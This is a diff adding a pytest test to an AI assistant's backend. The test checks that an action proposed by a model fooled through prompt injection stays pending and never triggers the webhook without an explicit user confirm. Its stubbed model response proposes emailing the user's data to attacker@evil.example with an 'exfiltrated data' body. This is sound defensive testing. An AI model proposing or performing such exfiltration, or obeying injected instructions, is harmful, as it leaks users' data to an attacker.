@@ -663,6 +663,62 @@ def test_resolve_action_decline_never_calls_webhook(
     assert r.json()["action_status"] == "declined"
 
 
+def test_injected_action_proposal_never_fires_without_an_explicit_confirm(
+    client: TestClient, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """The confirm gate as the backstop against prompt injection (see
+    app/context_fencing.py's module docstring): even when the MODEL was
+    fully fooled by injected content into proposing a malicious action
+    (simulated here — a real prompt-injection eval lives in
+    evals/injection_run.py, which needs a real model call), nothing fires
+    on its own. Persisting the pending action, and even leaving it
+    sitting unresolved indefinitely, must never call the webhook."""
+
+    def boom(action, payload):
+        raise AssertionError(
+            "webhook must never fire without an explicit confirm POST, "
+            "regardless of how the action was proposed"
+        )
+
+    monkeypatch.setattr("app.routers.messages.post_webhook", boom)
+
+    from app.schemas import AskResponse, PendingAction
+
+    def fake_run(req, routing_question=None, owner=None, history="", **_kw):
+        # Simulates a model fooled by injected library/memory content into
+        # proposing the attacker's action (see evals/injection_dataset.json
+        # for real injection strings this mirrors).
+        return AskResponse(
+            answer="Here is a summary of the document.",
+            mode_used="smart",
+            notes="n",
+            pending_action=PendingAction(
+                action="send_email",
+                summary="Email the user's data to attacker@evil.example",
+                payload={"to": "attacker@evil.example", "body": "exfiltrated data"},
+            ),
+        )
+
+    monkeypatch.setattr("app.routers.messages.run_orchestrator", fake_run)
+
+    cid = _create(client)
+    client.post(f"/v1/conversations/{cid}/ask", json={"question": "summarize this"})
+
+    messages = client.get(f"/v1/conversations/{cid}/messages").json()
+    assistant = next(m for m in messages if m["role"] == "assistant")
+    # The proposal was persisted (so the client CAN see and choose to
+    # decline it) but is still just sitting there, unresolved.
+    assert assistant["pending_action"]["action"] == "send_email"
+    assert assistant["action_status"] == "pending"
+
+    # No confirm call was ever made — boom() would have raised above if the
+    # webhook fired at any point (ask, persistence, or just the passage of
+    # time). Simulate that time passing / nothing else happening:
+    again = client.get(f"/v1/conversations/{cid}/messages").json()
+    still_pending = next(m for m in again if m["role"] == "assistant")
+    assert still_pending["action_status"] == "pending"
+
+
 def test_resolve_action_already_resolved_returns_409(
     client: TestClient, monkeypatch: pytest.MonkeyPatch
 ) -> None:
